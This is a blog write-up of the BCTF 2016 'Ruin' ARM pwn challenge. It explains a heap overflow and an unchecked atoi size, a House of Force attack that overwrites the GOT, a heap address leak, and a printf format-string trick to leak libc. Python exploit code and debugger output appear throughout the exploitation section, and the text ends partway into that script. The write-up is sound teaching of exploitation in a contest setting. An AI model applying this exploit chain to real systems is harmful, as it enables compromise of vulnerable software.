@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>BCTF 2016 - Ruin</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="This is an ARM 32b exploitation challenge part of the BCTF competition, which I've enjoyed playing with the team TheGoonies. During the...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="gef">
+    <meta name="tags" content="bctf-2016">
+    <meta name="tags" content="arm">
+    <meta name="tags" content="heap-overflow">
+    <meta name="tags" content="format-string">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="BCTF 2016 - Ruin"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="This is an ARM 32b exploitation challenge part of the BCTF competition, which I've enjoyed playing with the team TheGoonies. During the..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-03-21 22:51:04+11:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-03-21 22:51:04+11:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="gef"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="bctf-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="arm"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="heap-overflow"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="format-string"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="BCTF 2016 - Ruin">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="This is an ARM 32b exploitation challenge part of the BCTF competition, which I've enjoyed playing with the team TheGoonies. During the...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "BCTF 2016 - Ruin",
+  "headline": "BCTF 2016 - Ruin",
+  "datePublished": "2016-03-21 22:51:04+11:00",
+  "dateModified": "2016-03-21 22:51:04+11:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html",
+  "description": "This is an ARM 32b exploitation challenge part of the BCTF competition, which I've enjoyed playing with the team TheGoonies. During the..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">BCTF 2016 - Ruin</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">21 Mar 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>This is an ARM 32b exploitation challenge part of the <a href="https://ctftime.org/ctf/94">BCTF</a> competition,
+which I've enjoyed playing with the team TheGoonies. During the competition,
+only 18 teams (out of the 500+) were able to solve it. All props to them!</p>
+<p>The technique I used to solve it is a bit twisted but it works fine and
+reliably. So hang on ☺</p>
+<h3>Info</h3>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>!file<span class="w"> </span>ruin.7b694dc96bf316a40ff7163479850f78
+ruin.7b694dc96bf316a40ff7163479850f78:<span class="w"> </span>ELF<span class="w"> </span><span class="m">32</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>ARM,<span class="w"> </span>EABI5<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>dynamically<span class="w"> </span>linked,<span class="w"> </span>interpreter<span class="w"> </span>/lib/ld-linux-armhf.so.3,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.26,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>072b955ca434ca0c1df6507144d4a2c4cdc9078e,<span class="w"> </span>stripped
+gef➤<span class="w">  </span>checksec<span class="w"> </span>ruin.7b694dc96bf316a40ff7163479850f78
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>checksec<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ruin.7b694dc96bf316a40ff7163479850f78&#39;</span>
+Canary:<span class="w">                                           </span>Yes
+NX<span class="w"> </span>Support:<span class="w">                                       </span>Yes
+PIE<span class="w"> </span>Support:<span class="w">                                      </span>No
+RPATH:<span class="w">                                            </span>No
+RUNPATH:<span class="w">                                          </span>No
+Partial<span class="w"> </span>RelRO:<span class="w">                                    </span>No
+Full<span class="w"> </span>RelRO:<span class="w">                                       </span>No
+</code></pre></div>
+
+<p>Since the target is an ARM binary, I heavily relied on the tool I wrote,
+<a href="https://github.com/hugsy/gef">GDB-GEF</a> to help me in the exploitation process.</p>
+<h3>Vulnerability</h3>
+<p><code>ruin</code> is an ARM ELF binary that allows you to store "securely" messages in
+memory, acting like a safe.</p>
+<p>The real <code>main()</code> function starts at 0x00008A88 and starts by allocating on the
+heap (<code>malloc()</code>) an 8-byte chunk, then jump
+to a function at 0x89CC (which I've called <code>get_key_security</code>) to authenticate
+and unlock the safe.
+<img alt="get-key-security" src="https://i.imgur.com/WhZ5QLW.png"></p>
+<p>The <code>strncmp()</code> call trivially shows the expected initial key, in this case
+<code>security</code>. Once the safe is unlocked, 4 different operations are possible:</p>
+<ol>
+<li>Update the key (function @0x000087D0, which I will call <code>update_key()</code> in
+   the rest of this write-up): this function will allocate a
+   16-byte <code>key</code> chunk, and copy the content from stdin.</li>
+<li>Edit a secret stored (function @0x0000884C,  which I will call
+   <code>edit_secret()</code>): if the <code>secret</code> chunk is
+   not allocated, then the function invokes <code>malloc(8)</code>. Then it performs an
+   <code>fgets()</code> to store 24 bytes from stdin (us!) into this buffer. We immediately
+   spot a heap overflow here.
+<img alt="heap-ovf" src="https://i.imgur.com/sTpxqBT.png"></li>
+<li>Sign the secret with your name (function @0x000088B8, <code>sign_name()</code>): if the <code>name</code> chunk
+   is not NULL (i.e. already allocated), then the function returns. Otherwise,
+   it calls the <code>read_int()</code> function at 0x0875C which prompts the user for the
+   name size with <code>atoi()</code>, checks it's higher than 0x20 bytes, if
+   so, <code>malloc(size)</code> and reads its contents from stdin using <code>fgets()</code>.</li>
+</ol>
+<div class="highlight"><pre><span></span><code>.text:0000875C<span class="w">        </span>read_int<span class="w">                                </span><span class="p">;</span><span class="w"> </span>CODE<span class="w"> </span>XREF:<span class="w"> </span>sign_name+34
+.text:0000875C<span class="w"> </span><span class="nv">result</span><span class="w">          </span><span class="o">=</span><span class="w"> </span>-0x2C
+.text:0000875C<span class="w"> </span><span class="nv">buffer</span><span class="w">          </span><span class="o">=</span><span class="w"> </span>-0x28
+.text:0000875C<span class="w"> </span><span class="nv">canary</span><span class="w">          </span><span class="o">=</span><span class="w"> </span>-8
+.text:0000875C
+<span class="o">[</span>...<span class="o">]</span>
+.text:00008774<span class="w">                 </span>LDR<span class="w">     </span>R3,<span class="w"> </span><span class="o">=</span>stdin
+.text:00008778<span class="w">                 </span>LDR<span class="w">     </span>R3,<span class="w"> </span><span class="o">[</span>R3<span class="o">]</span>
+.text:0000877C<span class="w">                 </span>SUB<span class="w">     </span>R2,<span class="w"> </span>R11,<span class="w"> </span><span class="c1">#-buffer</span>
+.text:00008780<span class="w">                 </span>MOV<span class="w">     </span>R0,<span class="w"> </span>R2<span class="w">          </span><span class="p">;</span><span class="w"> </span>s
+.text:00008784<span class="w">                 </span>MOV<span class="w">     </span>R1,<span class="w"> </span><span class="c1">#32         ; n</span>
+.text:00008788<span class="w">                 </span>MOV<span class="w">     </span>R2,<span class="w"> </span>R3<span class="w">          </span><span class="p">;</span><span class="w"> </span>stream
+.text:0000878C<span class="w">                 </span>BL<span class="w">      </span>fgets
+.text:00008790<span class="w">                 </span>SUB<span class="w">     </span>R3,<span class="w"> </span>R11,<span class="w"> </span><span class="c1">#-buffer</span>
+.text:00008794<span class="w">                 </span>MOV<span class="w">     </span>R0,<span class="w"> </span>R3<span class="w">          </span><span class="p">;</span><span class="w"> </span>nptr
+.text:00008798<span class="w">                 </span>BL<span class="w">      </span>atoi
+.text:0000879C<span class="w">                 </span>STR<span class="w">     </span>R0,<span class="w"> </span><span class="o">[</span>R11,#result<span class="o">]</span>
+</code></pre></div>
+
+<ol>
+<li>Leave (function @0x00008978, <code>leave()</code>): invokes <code>free()</code> to de-allocate the 3
+   buffers allocated by the steps above, and then exit cleanly.</li>
+</ol>
+<p>We have 2 vulnerabilities here:</p>
+<ul>
+<li>The heap overflow explained in the <code>edit_secret()</code> function</li>
+<li>The integer overflow from the <code>sign_name()</code> function, since the <code>atoi()</code>
+   call is not checked for negative integer before being compared. This allows
+   us to control the size of the next <code>malloc()</code> call (the one used to store the
+   name).</li>
+</ul>
+<h3>Exploitation</h3>
+<h4>The House of Force</h4>
+<p>With those 2 vulnerabilities, and the fact that we can control another chunk to
+be allocated (through the <code>update_key()</code> function), we have now a perfect
+scenario for an <strong>"House of Force"</strong> heap exploitation. If you need a reminder, I
+recommend you read <a href="http://phrack.org/issues/66/10.html">this</a> and
+<a href="https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/">this</a>.</p>
+<p>The idea behind this attack (which still works against recent libc heap
+allocator), is to be able to control the size of one chunk. By making the value
+of the size for this new chunk very big, it will allow us to overflow the
+address space, and make the chunk upper bound finish in an "interesting" writable
+location, for example, the
+<a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">Global Offset Table</a>.</p>
+<p>When we reach the "main" loop, the <code>secret</code> chunk (8 bytes) is already
+allocated. So we can use the <code>malloc(name_size)</code> to create a chunk that will
+overflow the address space and end in the GOT, which starts at 0x00010F48.</p>
+<div class="highlight"><pre><span></span><code><span class="w">                    </span>0xffffffff<span class="w">   </span>.<span class="w">            </span>.
+<span class="w">                                 </span>.<span class="w">            </span>.
+<span class="w">                                 </span><span class="p">|</span><span class="w">     </span>^<span class="w">      </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w">      </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w">      </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w">      </span><span class="p">|</span><span class="w">     </span>malloc<span class="o">()</span><span class="w"> </span>call<span class="w"> </span><span class="k">for</span><span class="w"> </span>allocating<span class="w"> </span>the
+<span class="w">                                 </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w">      </span><span class="p">|</span><span class="w">     </span>name.
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">   </span>secret<span class="w">   </span><span class="p">|</span><span class="w">  </span>&lt;-<span class="w"> </span>Heap<span class="w"> </span>overflow:<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>overwrite<span class="w"> </span>the
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span><span class="w">     </span>chunk<span class="o">)</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span>
+<span class="w">                                 </span>.<span class="w">            </span>.
+<span class="w">                                 </span>.<span class="w">            </span>.
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>printf@got<span class="w"> </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>exit@got<span class="w">   </span><span class="p">|</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>puts@got<span class="w">   </span><span class="p">|</span><span class="w"> </span>&lt;-<span class="w"> </span>Target<span class="w"> </span>we<span class="w"> </span>want<span class="w"> </span>overridden
+<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>free@got<span class="w">   </span><span class="p">|</span><span class="w">    </span>so<span class="w"> </span>we<span class="w"> </span>make<span class="w"> </span>malloc<span class="o">(</span>name_length<span class="o">)</span>
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span><span class="w">    </span>header<span class="o">)</span>.<span class="w"> </span>The<span class="w"> </span>next<span class="w"> </span>malloc<span class="o">(</span>key<span class="o">)</span><span class="w"> </span>will
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span><span class="w">    </span>overwrite<span class="w"> </span>the<span class="w"> </span>GOT<span class="w"> </span>with<span class="w"> </span>controlled
+<span class="w">                                 </span><span class="p">|</span><span class="w">            </span><span class="p">|</span><span class="w">    </span>data.
+<span class="w">                     </span>0x00000000<span class="w">  </span>.<span class="w">            </span>.
+</code></pre></div>
+
+<p>So what size do we need for the <em>name</em> chunk? We know that the <em>key</em> chunk can
+write 16 bytes, so 4 DWORD. And also, the target address must be aligned to 2
+DWORD (8 bytes - because it is an ARM 32 bits).</p>
+<p><img alt="got" src="https://i.imgur.com/DQjJxu6.png"></p>
+<h4>Leaking heap memory</h4>
+<p>But we have a problem, we don't know where the heap pages are located in the memory
+<code>fread()</code>, which unlike
+<code>fgets()</code> does not append a NULL byte at the end of the string.</p>
+<p><img alt="auth-func" src="https://i.imgur.com/Wml7uwI.png"></p>
+<p>This allows to leak addresses some precious bytes from the heap, doing something like this:</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">auth</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;please input your 8-bit key:&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; is wrong, try again!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">:</span> <span class="n">leak</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">i_u</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;please input your 8-bit key:&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;security&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">leak</span>
+</code></pre></div>
+
+<h4>Controlling $pc</h4>
+<p>From the heap memory leak, we know the address of the <code>secret</code> chunk, which
+means that the <code>name</code> chunk headers will be located exactly 8 bytes after.</p>
+<div class="highlight"><pre><span></span><code><span class="w">     </span><span class="p">|</span><span class="w">  </span>secret<span class="w">  </span><span class="p">|</span><span class="w">  </span>name<span class="w">     </span><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>key<span class="w">      </span><span class="p">|</span>
+</code></pre></div>
+
+<p>So we must set the length for the <code>name</code> chunk dynamically by using the
+<code>update_key()</code> function:</p>
+<div class="highlight"><pre><span></span><code><span class="n">ATOI_GOT</span>   <span class="o">=</span> <span class="mh">0x00010F80</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="mi">8</span>
+<span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<span class="k">def</span> <span class="nf">sign_name</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+    <span class="n">select_menu_entry</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="n">new_sz</span> <span class="o">=</span> <span class="o">-</span><span class="n">addr</span> <span class="o">+</span> <span class="n">ATOI_GOT</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;JUNK&quot;</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;malloc(name) with size=</span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">new_sz</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;please input your name length:&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">new_sz</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;enter your name:&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="k">return</span>
+
+<span class="n">secret_addr</span>    <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mi">8</span>
+<span class="n">name_addr</span>      <span class="o">=</span> <span class="n">secret_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span>
+
+<span class="n">sign_name</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">name_addr</span><span class="p">)</span>
+</code></pre></div>
+
+<p>The heap is now set dynamically with the correct offset. The next call to
+<code>malloc()</code> will overwrite the GOT entry of <code>atoi@got</code> with our data!</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">update_key</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;malloc(key)&quot;</span><span class="p">)</span>
+    <span class="n">select_menu_entry</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="n">key</span><span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xbb</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">4</span>              <span class="c1"># atoi@got will be overwritten with this value</span>
+    <span class="n">key</span><span class="o">+=</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;D&quot;</span><span class="o">*</span><span class="mi">4</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;enter the new 16-bit key:&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;the key is updated!&quot;</span><span class="p">)</span>
+    <span class="k">return</span>
+
+<span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;Leaving - and triggering atoi@got&quot;</span><span class="p">)</span>
+    <span class="n">select_menu_entry</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="k">return</span>
+</code></pre></div>
+
+<p>Which produces the following result in <code>gef</code>:
+<img alt="control-pc" src="https://i.imgur.com/UdmAg6N.png"></p>
+<p>Bingo! We control the execution flow! Good! But now where do we go?</p>
+<p>The binary is dynamically linked, and does not contains any gadget that would
+allow us to call directly <code>execve</code> so we need a leak from the libc.</p>
+<h4>Using function indirection to leak memory using printf</h4>
+<p>I'm not sure if this is the best way to do, but I like this approach: the idea
+is that, when you can overwrite the GOT, point an "interesting" function of the
+control flow to <code>printf@plt</code>. This way, if you can control the parameter of this
+call, you can use a regular format string attack to read/write everywhere!!</p>
+<p>The <code>read_int()</code> (at 0x875c) offers a perfect exploitation case:
+<img alt="read-int-ida" src="https://i.imgur.com/81p3djs.png"></p>
+<p><code>fgets</code> at 0x878c allows us to provide 32 bytes in the stack, which will be
+given to <code>atoi</code> as a parameter. So if we overwrite <code>atoi@got</code> with the address
+of <code>printf@plt</code>, we have a good case for a format string attack.</p>
+<p>So using the technique above, we can overwrite <code>atoi@got</code> with the address of
+<code>printf</code> in the <a href="https://en.wikipedia.org/wiki/Dynamic_linker">PLT</a>:</p>
+<div class="highlight"><pre><span></span><code>.plt:00008594<span class="w"> </span><span class="p">;</span><span class="w"> </span>int<span class="w"> </span>printf<span class="o">(</span>const<span class="w"> </span>char<span class="w"> </span>*format,<span class="w"> </span>...<span class="o">)</span>
+.plt:00008594<span class="w"> </span><span class="nb">printf</span><span class="w">                                  </span><span class="p">;</span><span class="w"> </span>CODE<span class="w"> </span>XREF:<span class="w"> </span>print_banner+58
+.plt:00008594<span class="w">                                         </span><span class="p">;</span><span class="w"> </span>update_key+38<span class="w"> </span>...
+.plt:00008594<span class="w">                 </span>ADR<span class="w">     </span>R12,<span class="w"> </span>0x859C
+.plt:00008598<span class="w">                 </span>ADD<span class="w">     </span>R12,<span class="w"> </span>R12,<span class="w"> </span><span class="c1">#0x8000</span>
+.plt:0000859C<span class="w">                 </span>LDR<span class="w">     </span>PC,<span class="w"> </span><span class="o">[</span>R12,#<span class="o">(</span>printf_ptr<span class="w"> </span>-<span class="w"> </span>0x1059C<span class="o">)]</span>!<span class="w"> </span><span class="p">;</span><span class="w"> </span>__imp_printf
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>    <span class="n">update_key</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">PRINTF_IMPORT</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;atoi@got: </span><span class="si">%#x</span><span class="s2"> -&gt; </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ATOI_GOT</span><span class="p">,</span> <span class="n">PRINTF_IMPORT</span><span class="p">))</span>
+</code></pre></div>
+
+<p>So now every time the control flow will hit the <code>atoi()</code> function, the <code>printf()</code>
+stub will be executed, and we will receive the argument from the socket! So
+every time the banner will prompt for a choice (1-4), the buffer we send will be
+the argument to <code>printf()</code>.</p>
+<h4>Triggering the exploit</h4>
+<p>By leaking the memory, we find that an address to the libc can be found (at
+least) at the offset 21:
+<img alt="libc-leak" src="https://i.imgur.com/Q5UpCbc.png"></p>
+<p>On the C library I tested, the <code>system()</code> function was located at an offset of
+0x37524 from the base. So now, we know the address of <code>system()</code>:</p>
+<div class="highlight"><pre><span></span><code>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;data&gt; %21$#.8x</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&quot;data&gt; &quot;</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">:</span>
+            <span class="k">break</span>
+
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x16d24</span>
+    <span class="n">libc_system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x37524</span>
+
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;Got libc_leak: </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">libc_leak</span><span class="p">)</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;Got libc_base: </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
